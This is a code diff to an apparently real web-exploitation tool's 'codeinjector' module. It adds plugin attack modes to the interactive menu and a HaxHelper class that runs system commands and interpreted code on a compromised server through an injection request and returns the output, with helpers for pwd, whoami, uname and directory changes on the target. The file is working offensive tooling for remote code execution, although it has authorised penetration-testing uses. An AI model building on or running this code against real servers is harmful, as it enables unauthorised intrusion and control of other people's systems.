@@ -67,6 +67,8 @@ class codeinjector(baseClass):
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()[language]
         
+        plugman = self.config["PLUGINMANAGER"]
+        
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
         if (not ispost):
@@ -170,7 +172,7 @@ class codeinjector(baseClass):
                     
             attack = None
             while (attack != "q"):
-                attack = self.chooseAttackMode(language, php=php_inject_works, syst=sys_inject_works)
+                attack = self.chooseAttackMode(language, php_inject_works, sys_inject_works, isUnix)
                 
 
                 if (type(attack) == str):
@@ -209,7 +211,9 @@ class codeinjector(baseClass):
                         print "Do not forget to close this security hole."
                         sys.exit(0)
                     else:
-                        print "Strange stuff..."
+                        haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, item)
+                        plugman.broadcast_callback(attack, haxhelper)
+                        #ASDF
                 else:
                     cpayload = attack.generatePayload()
 
@@ -266,6 +270,9 @@ class codeinjector(baseClass):
         else:
             print "Failed to test injection. :("
 
+
+    def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True):
+        return(self.__doHaxRequest(url, postdata, m, payload, langClass, appendix, doFilter))
 
     def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True):
         code = None
@@ -393,7 +400,7 @@ class codeinjector(baseClass):
         return(userload.strip())
 
 
-    def chooseAttackMode(self, language, php=True, syst=True):
+    def chooseAttackMode(self, language, php=True, syst=True, isUnix=True):
         header = ""
         choose = {}
         textarr = []
@@ -423,8 +430,15 @@ class codeinjector(baseClass):
                 choose[idx] = v
                 idx = idx +1
 
-        #pluginman = self.config["PLUGINMANAGER"]
-        #plugin_attacks = pluginman.requestExploitAttacks(langClass, php, syst)
+        pluginman = self.config["PLUGINMANAGER"]
+        plugin_attacks = pluginman.requestPluginActions(langClass, syst, isUnix)
+        
+        for attacks in plugin_attacks:
+            pluginName, attackmode = attacks
+            label, callback = attackmode
+            textarr.append("[%d] [%s] %s" %(idx, pluginName, label))
+            choose[idx] = callback
+            idx += 1
 
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
@@ -554,3 +568,71 @@ class codeinjector(baseClass):
                 return(ret)
             except:
                 print "Invalid script ID."
+                
+                
+class HaxHelper:
+    def __init__(self, parent, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell):
+        """ Initiator of HaxHelper. As plugin developer you should never use this. """
+        self.parent_codeinjector = parent
+        self.url = url
+        self.postdata = postdata
+        self.mode = mode
+        self.langClass = langClass
+        self.suffix = suffix
+        self.isunix = isUnix
+        self.issys  = sys_inject_works
+        self.shell  = working_shell
+        
+        self.generic_lang = self.parent_codeinjector.config["XML2CONFIG"]
+        
+    def executeSystemCommand(self, command):
+        """ Execute a system command on the vulnerable system. Returns a String which contains it's result if all OK. False if we can't inject system commands. None if something went wrong. """
+        if (self.canExecuteSystemCommands()):
+            cmd = self.shell.generatePayload(command)
+            return(self.parent_codeinjector._doHaxRequest(self.url, self.postdata, self.mode, cmd, self.langClass, self.suffix).strip())
+        return(False)
+    
+    def executeCode(self, code):
+        """ Execute interpreted code on the vulnerable system and returns it's response (filtered). """
+        return(self.parent_codeinjector._doHaxRequest(self.url, self.postdata, self.mode, code, self.langClass, self.suffix).strip())
+    
+    def isUnix(self):
+        """ Returns True if the vulnerable machine is a unix box. """
+        return(self.isunix)
+    
+    def isWindows(self):
+        """ Returns True if the vulnerable machine is a windows box. """
+        return(not self.isunix)
+    
+    def getLangName(self):
+        """ Get the language name of the vulnerable script as String. """
+        return(self.langClass.getName().lower())
+    
+    def canExecuteSystemCommands(self):
+        """ Returns True if we are able to execute system commands. Otherwise False. """
+        return(self.issys)
+    
+    def concatCommands(self, commands):
+        """ Give this command a array of system-commands and it will concat them for the vulnerable system. """
+        return(self.generic_lang.concatCommands(commands, self.isunix))
+    
+    def getPWDCommand(self):
+        """ Returns a `pwd` command for the vulnerable server. """
+        return(self.generic_lang.getCurrentDirCode(self.isunix))
+    
+    def getUsernameCommand(self):
+        """ Returns a `whoami` command for the vulnerable server. """
+        return(self.generic_lang.getCurrentUserCode(self.isunix))
+    
+    def getConcatSymbol(self):
+        """ Returns the concat symbol which is correct for the server. """
+        return(self.generic_lang.getConcatSymbol(self.isunix))
+    
+    def generateChangeDirectoryCommand(self, newdir):
+        """ Generate system-code to change directory. """
+        return(self.generic_lang.generateChangeDirectoryCommand(newdir, self.isunix))
+    
+    def getUNAMECommand(self):
+        """ Get a system-command which tells us the kernel version. """
+        return(self.generic_lang.getKernelCode(self.isunix))    
+        
